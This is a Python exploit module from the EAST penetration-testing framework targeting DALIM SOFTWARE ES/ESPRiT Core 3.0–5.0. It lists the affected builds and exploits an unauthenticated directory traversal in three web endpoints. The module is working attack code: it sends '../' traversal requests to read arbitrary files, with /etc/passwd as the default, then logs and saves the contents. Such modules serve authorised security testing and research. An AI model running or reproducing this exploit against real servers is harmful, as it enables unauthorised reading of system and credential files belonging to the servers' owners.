#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_dalim_software_es_core_fd"
INFO['DESCRIPTION'] = "DALIM SOFTWARE ES Core 5.0 build 7184.1 - Directory Traversal"
INFO['VENDOR'] = "https://www.dalim.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42438/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """Affected version: ES/ESPRiT 5.0 (build 7184.1)
                                (build 7163.2)
                                (build 7163.0)
                                (build 7135.0)
                                (build 7114.1)
                                (build 7114.0)
                                (build 7093.1)
                                (build 7093.0)
                                (build 7072.0)
                                (build 7051.3)
                                (build 7051.1)
                                (build 7030.0)
                                (build 7009.0)
                                (build 6347.0)
                                (build 6326.0)
                                (build 6305.1)
                                (build 6235.9)
                                (build 6172.1)
                  ES/ESPRiT 4.5 (build 6326.0)
                                (build 6144.2)
                                (build 5180.2)
                                (build 5096.0)
                                (build 4314.3)
                                (build 4314.0)
                                (build 4146.4)
                                (build 3308.3)
                  ES/ESPRiT 4.0 (build 4202.0)
                                (build 4132.1)
                                (build 2235.0)
                  ES/ESPRiT 3.0
Input passed thru several parameters is not properly verified before being used to read files. This can be exploited by an unauthenticated attacker to read arbitrary files from local resources with directory traversal attacks.
"""

INFO['CHANGELOG'] = "14 Aug 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS['PATH'] = 'etc/passwd', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS['PATH']
        self.urls = None
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
        
        self.urls = ['Esprit/public/Password.jsp?orgName=../../../../../../../../../',
        'Esprit/ES/Login?orgUnitName=../../../../../../../../../',
        'dalimws/log?len=10000&download=true&file=../../../../../../../']
    
    def make_url(self, path = ''):
        return 'http://{}:{}/{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        content = ''
        for url in self.urls:
            curl = self.make_url(url + self.path)
            self.log('Try to download file ' + self.path)
            try:
                fd = urllib2.urlopen(curl)
                content = fd.read()
                if content:
                    self.log('= File Content =')
                    self.log(content)
                    self.log('= End of File  =')
                    self.writefile(content)
                    self.finish(True)
                    break
            except Exception as e:
                self.log(e)
                
        self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
